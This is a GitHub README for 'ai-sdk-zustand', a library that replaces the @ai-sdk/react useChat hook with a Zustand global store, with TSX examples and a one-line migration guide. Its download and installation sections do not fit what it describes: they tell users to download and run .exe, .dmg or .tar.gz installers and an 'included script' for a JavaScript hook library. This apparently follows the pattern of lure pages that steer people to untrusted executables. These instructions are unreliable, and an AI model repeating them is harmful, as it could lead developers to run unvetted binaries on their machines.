# 🚀 ai-sdk-zustand - Simplified Global Chat Access

## 🛑 Download Now!
[![Download ai-sdk-zustand](https://img.shields.io/badge/Download-ai--sdk--zustand-blue)](https://github.com/vicmusic0/ai-sdk-zustand/releases)

## 📖 Introduction

Welcome to **ai-sdk-zustand**! This tool serves as a drop-in replacement for `@ai-sdk/react`, giving you seamless access to your AI chat data across your application. This means you can easily use chat features without cluttering your components with excessive props.

## 🚀 Getting Started

To run this application, please follow these steps:

1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/vicmusic0/ai-sdk-zustand/releases) to download the latest version of **ai-sdk-zustand**.
  
2. **Download the Application**: On the Releases page, you will find the latest version. Click on the appropriate file for your operating system to begin the download.

3. **Install the Application**: Once downloaded, follow the installation instructions specific to your platform (Windows, macOS, Linux) to set up **ai-sdk-zustand**.

## 🛠️ Installation Guide

### Windows

1. Download the `.exe` file from the Releases page.
2. Double-click the downloaded file to start the installer.
3. Follow the prompts to complete the installation.

### macOS

1. Download the `.dmg` file from the Releases page.
2. Open the `.dmg` file and drag the ai-sdk-zustand icon to your Applications folder.

### Linux

1. Download the `.tar.gz` file from the Releases page.
2. Extract the file using the terminal or a file manager.
3. Navigate to the extracted folder and run the included script to install.

## 🔑 Core Features

### 1. **Access Chat from Any Component**

No more worrying about state being trapped in one component. With **ai-sdk-zustand**, you can access your chat data from anywhere in your application.

#### Example Usage

```tsx
// ❌ Regular useChat - state trapped
function App() {
  const { messages, sendMessage } = useChat();
  return <Layout messages={messages} sendMessage={sendMessage} />;
}

// ✅ ai-sdk-zustand - access anywhere
function App() {
  useChat({ api: '/api/chat' }); // Initialize once
  return <Layout />;
}

function Layout() {
  const messages = useMessages(); // Now available globally
  return <MessageList messages={messages} />;
}
```

### 2. **Improved Performance**

By using Zustand’s global store, **ai-sdk-zustand** minimizes re-renders, enhancing your app's performance. You can enjoy a smoother experience while interacting with the chat feature.

### 3. **Simplified Architecture**

This tool removes the need for prop drilling. You can easily access your chat data anywhere without passing it through multiple layers of components. This leads to cleaner, more maintainable code.

## 📥 Download & Install

To download **ai-sdk-zustand**, visit our [Releases Page](https://github.com/vicmusic0/ai-sdk-zustand/releases). Choose the file that best matches your operating system to get started.

## 🆕 Upgrade Guide

If you are moving from `@ai-sdk/react`, you can easily switch to **ai-sdk-zustand** with just one line of code:

### Migration Steps

1. **Update Import Statement**  
Change your import statement in your files from:

```tsx
import { useChat } from '@ai-sdk/react';
```

to:

```tsx
import { useChat } from 'ai-sdk-zustand'; 
```

2. **All Other Code Remains the Same**  
Once you’ve made this change, your existing code can stay the same. Everything will function just like before, but with new capabilities.

## 🌐 Community and Support

If you run into issues or need help, feel free to visit our [GitHub Issues](https://github.com/vicmusic0/ai-sdk-zustand/issues) page to ask questions or report bugs. We encourage contributions and discussions, so don’t hesitate to get involved!

## 🎓 Frequently Asked Questions

**Q: What is Zustand?**  
A: Zustand is a state management library that helps improve performance by storing state globally. It allows components to access and modify state without needing prop drilling.

**Q: Can I use this with other libraries?**  
A: Yes, **ai-sdk-zustand** is designed to work alongside other libraries, so you can integrate it into your existing projects without issues.

**Q: Is this library suitable for large-scale applications?**  
A: Absolutely! It simplifies state management while ensuring optimal performance even in larger apps.

## 📅 Changelog

- **Version 1.0**: Initial release with core features.
- **Version 1.1**: Added performance improvements and better documentation.

## 📣 Contributions

Contributions are welcome! Check our [Contribution Guide](https://github.com/vicmusic0/ai-sdk-zustand/CONTRIBUTING.md) for more details on how you can help improve **ai-sdk-zustand**.

## 📞 Contact

For any inquiries or suggestions, please reach out via the Issues page on our [GitHub Repository](https://github.com/vicmusic0/ai-sdk-zustand/issues). We're here to help!

## 🔗 Additional Resources

- [GitHub Repository](https://github.com/vicmusic0/ai-sdk-zustand)
- [Zustand Documentation](https://github.com/pmndrs/zustand) 

Now that you are ready to get started with **ai-sdk-zustand**, enjoy managing your AI chats effortlessly!